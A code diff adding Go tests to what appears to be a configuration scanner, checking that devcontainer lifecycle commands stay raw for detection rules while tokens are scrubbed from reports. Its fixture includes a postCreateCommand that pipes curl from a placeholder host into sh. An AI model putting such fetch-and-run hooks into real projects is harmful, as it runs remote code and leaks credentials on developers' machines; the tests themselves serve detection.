@@ -368,3 +368,46 @@ func FuzzParseConfig(f *testing.F) {
 		}
 	})
 }
+
+// TestDetectViewKeepsRawCommands checks that rules see lifecycle
+// commands and Feature references as written, while the payload, which
+// every report is built from, stays sanitized.
+func TestDetectViewKeepsRawCommands(t *testing.T) {
+	t.Parallel()
+	root := t.TempDir()
+	kittest.WriteFile(t, filepath.Join(root, ".devcontainer", "devcontainer.json"), `{
+		"postCreateCommand": "curl -fsSL 'https://e.example.invalid/i.sh?token=dc-raw-777' | sh",
+		"onCreateCommand": ["curl", "https://e.example.invalid/i.sh?token=dc-raw-777"],
+		"features": {"https://e.example.invalid/f.tgz?token=dc-raw-777": {}}
+	}`)
+	got := kittest.Discover(t, New(Options{}), root)
+	items := got.Find(".devcontainer/devcontainer.json", model.ConfigKindEnvSetup)
+	if len(items) != 3 {
+		t.Fatalf("items = %+v", items)
+	}
+	for _, item := range items {
+		if strings.Contains(string(item.Payload), "dc-raw-777") {
+			t.Fatalf("payload leaks the token: %s", item.Payload)
+		}
+		if !strings.Contains(string(item.Detect), "dc-raw-777") {
+			t.Fatalf("detect view lost the raw text: %s", item.Detect)
+		}
+	}
+}
+
+// TestArrayCommandWithNonString checks that an array command holding a
+// non-string is a diagnostic and is not emitted as a command.
+func TestArrayCommandWithNonString(t *testing.T) {
+	t.Parallel()
+	root := t.TempDir()
+	kittest.WriteFile(t, filepath.Join(root, ".devcontainer", "devcontainer.json"), `{"postCreateCommand": ["curl", 1, "https://e.example.invalid/i.sh"]}`)
+	got := kittest.Discover(t, New(Options{}), root)
+	items := got.Find(".devcontainer/devcontainer.json", model.ConfigKindEnvSetup)
+	if len(items) != 1 || !got.HasDiag("postCreateCommand must be a string or an array of strings") {
+		t.Fatalf("items = %+v, diagnostics = %v", items, got.Diagnostics)
+	}
+	p := kittest.Payload(t, items[0])
+	if _, ok := p["command"]; ok || p["form"] != "other" || items[0].Detect != nil {
+		t.Fatalf("payload = %v, detect = %s", p, items[0].Detect)
+	}
+}
